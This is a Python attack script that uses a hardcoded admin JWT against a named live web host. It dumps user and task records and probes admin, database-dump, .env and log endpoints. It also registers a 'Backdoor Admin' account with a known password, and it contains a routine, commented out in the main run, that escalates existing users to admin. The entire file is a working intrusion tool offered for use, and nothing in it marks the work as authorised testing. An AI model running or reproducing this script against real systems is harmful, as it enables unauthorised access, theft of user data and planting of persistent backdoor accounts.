#!/usr/bin/env python3
"""
Admin Enumeration Script
Full access with admin token
"""

import requests
import json

class AdminEnumerator:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.headers = {"Authorization": f"Bearer {token}"}
        
    def enumerate_users(self):
        """Get all users"""
        print("\n" + "="*60)
        print("ENUMERATING USERS")
        print("="*60)
        
        url = f"{self.base_url}/api/users"
        
        try:
            resp = self.session.get(url, headers=self.headers, timeout=5)
            print(f"Status: {resp.status_code}")
            
            if resp.status_code == 200:
                users = resp.json()
                print(f"\n[+] Found {len(users)} users:")
                print(json.dumps(users, indent=2))
                return users
            else:
                print(f"Response: {resp.text}")
                
        except Exception as e:
            print(f"Error: {e}")
        
        return None
    
    def enumerate_tasks(self):
        """Get all tasks"""
        print("\n" + "="*60)
        print("ENUMERATING TASKS")
        print("="*60)
        
        url = f"{self.base_url}/api/tasks"
        
        try:
            resp = self.session.get(url, headers=self.headers, timeout=5)
            print(f"Status: {resp.status_code}")
            
            if resp.status_code == 200:
                tasks = resp.json()
                print(f"\n[+] Found {len(tasks)} tasks:")
                print(json.dumps(tasks, indent=2))
                return tasks
            else:
                print(f"Response: {resp.text}")
                
        except Exception as e:
            print(f"Error: {e}")
        
        return None
    
    def access_admin_panel(self):
        """Access admin endpoints"""
        print("\n" + "="*60)
        print("ACCESSING ADMIN ENDPOINTS")
        print("="*60)
        
        admin_endpoints = [
            '/api/admin',
            '/api/admin/users',
            '/api/admin/tasks',
            '/api/admin/config',
            '/api/admin/database',
            '/api/admin/logs',
            '/api/admin/settings',
            '/api/admin/stats',
            '/api/admin/db',
        ]
        
        for endpoint in admin_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = self.session.get(url, headers=self.headers, timeout=5)
                print(f"\n{endpoint}")
                print(f"Status: {resp.status_code}")
                
                if resp.status_code == 200:
                    print("[+] Accessible!")
                    try:
                        data = resp.json()
                        print(json.dumps(data, indent=2)[:500])
                    except:
                        print(resp.text[:500])
                elif resp.status_code == 404:
                    print("[-] Not found")
                elif resp.status_code == 403:
                    print("[-] Forbidden")
                else:
                    print(f"Response: {resp.text[:200]}")
                    
            except Exception as e:
                print(f"Error: {e}")
    
    def test_database_access(self):
        """Try to access database"""
        print("\n" + "="*60)
        print("DATABASE ACCESS TESTING")
        print("="*60)
        
        db_endpoints = [
            '/api/db',
            '/api/database',
            '/api/admin/db',
            '/api/admin/database',
            '/api/admin/db/query',
            '/api/admin/database/query',
            '/api/admin/db/dump',
            '/api/admin/database/dump',
            '/api/admin/db/export',
        ]
        
        for endpoint in db_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = self.session.get(url, headers=self.headers, timeout=5)
                print(f"\n{endpoint}: {resp.status_code}")
                
                if resp.status_code == 200:
                    print("[!!!] DATABASE ENDPOINT ACCESSIBLE!")
                    print(resp.text[:500])
                    
            except Exception as e:
                print(f"Error: {e}")
    
    def test_file_access(self):
        """Try to access sensitive files"""
        print("\n" + "="*60)
        print("FILE ACCESS TESTING")
        print("="*60)
        
        files = [
            '/api/admin/config/env',
            '/api/admin/files/.env',
            '/api/admin/backup',
            '/api/admin/logs/access.log',
            '/api/admin/logs/error.log',
        ]
        
        for file_path in files:
            url = f"{self.base_url}{file_path}"
            try:
                resp = self.session.get(url, headers=self.headers, timeout=5)
                print(f"\n{file_path}: {resp.status_code}")
                
                if resp.status_code == 200:
                    print("[!!!] FILE ACCESSIBLE!")
                    print(resp.text[:500])
                    
            except Exception as e:
                print(f"Error: {e}")
    
    def create_admin_user(self):
        """Try to create another admin user"""
        print("\n" + "="*60)
        print("CREATING BACKDOOR ADMIN USER")
        print("="*60)
        
        url = f"{self.base_url}/api/auth/register"
        
        backdoor_user = {
            "name": "Backdoor Admin",
            "email": "backdoor@test.com",
            "password": "Backdoor123!",
            "role": "admin"
        }
        
        try:
            resp = self.session.post(url, json=backdoor_user, headers=self.headers, timeout=5)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code in [200, 201]:
                print("[+] Backdoor admin created successfully!")
                
        except Exception as e:
            print(f"Error: {e}")
    
    def test_privilege_escalation(self):
        """Test privilege escalation on existing users"""
        print("\n" + "="*60)
        print("PRIVILEGE ESCALATION TESTING")
        print("="*60)
        
        # First get all users
        users = self.enumerate_users()
        
        if users:
            for user in users[:3]:  # Test first 3 users
                user_id = user.get('id') or user.get('user_id')
                if user_id:
                    print(f"\n[*] Attempting to escalate user {user_id} to admin...")
                    
                    url = f"{self.base_url}/api/admin/users/{user_id}"
                    update_data = {"role": "admin"}
                    
                    try:
                        resp = self.session.patch(url, json=update_data, headers=self.headers, timeout=5)
                        print(f"Status: {resp.status_code}")
                        
                        if resp.status_code == 200:
                            print(f"[+] Successfully escalated user {user_id}!")
                            
                    except Exception as e:
                        print(f"Error: {e}")
    
    def decode_jwt(self):
        """Decode JWT token to see claims"""
        print("\n" + "="*60)
        print("JWT TOKEN ANALYSIS")
        print("="*60)
        
        import base64
        
        parts = self.token.split('.')
        if len(parts) == 3:
            # Decode header
            header = parts[0] + '=' * (4 - len(parts[0]) % 4)
            try:
                header_decoded = base64.b64decode(header)
                print(f"\nHeader: {header_decoded.decode()}")
            except:
                pass
            
            # Decode payload
            payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
            try:
                payload_decoded = base64.b64decode(payload)
                print(f"Payload: {payload_decoded.decode()}")
                
                # Parse as JSON
                import json
                claims = json.loads(payload_decoded)
                print(f"\nClaims:")
                for key, value in claims.items():
                    print(f"  {key}: {value}")
                    
            except Exception as e:
                print(f"Error decoding: {e}")
    
    def run_full_enumeration(self):
        """Run complete enumeration"""
        print("="*60)
        print("ADMIN ENUMERATION")
        print(f"Target: {self.base_url}")
        print("="*60)
        
        # Decode JWT
        self.decode_jwt()
        
        # Enumerate users
        self.enumerate_users()
        
        # Enumerate tasks
        self.enumerate_tasks()
        
        # Access admin panel
        self.access_admin_panel()
        
        # Test database access
        self.test_database_access()
        
        # Test file access
        self.test_file_access()
        
        # Create backdoor
        self.create_admin_user()
        
        # Test privilege escalation
        # self.test_privilege_escalation()
        
        print("\n" + "="*60)
        print("ENUMERATION COMPLETE")
        print("="*60)

if __name__ == "__main__":
    target = "http://fresh-start-267.emergent.host"
    admin_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"
    
    enumerator = AdminEnumerator(target, admin_token)
    enumerator.run_full_enumeration()
